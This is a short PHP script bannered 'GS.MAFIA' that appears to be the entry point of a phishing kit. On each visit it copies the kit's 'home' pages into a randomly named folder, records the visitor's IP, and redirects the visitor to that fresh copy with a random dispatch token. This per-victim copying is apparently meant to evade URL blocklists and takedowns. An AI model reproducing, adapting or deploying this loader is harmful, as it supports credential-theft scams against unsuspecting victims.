<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
include("./home/Languages/index.php");
include("./home/settings/gs_config.php");
$to = "gs_gen/gs".md5(base64_encode(rand(0,10000).gmdate("His")));
$_SESSION['gs_ip'] = getclientip();
gs_copyit("home",$to);
header("Location: ".$to."?dispatch=".gs_genRan());

?>